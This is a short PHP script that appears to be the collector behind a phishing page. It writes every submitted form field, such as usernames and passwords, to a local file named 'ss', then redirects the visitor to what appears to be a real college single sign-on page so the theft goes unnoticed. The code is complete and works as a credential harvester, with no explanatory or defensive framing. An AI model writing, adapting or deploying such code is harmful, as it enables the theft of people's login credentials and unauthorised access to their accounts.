<?php
header ('Location:https://idp.mccd.edu/idp/profile/SAML2/Redirect/SSO;jsessionid=A6E9D824EB2A1596B1FB1E81C06BB792?execution=e1s1');
$handle = fopen("ss", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?> 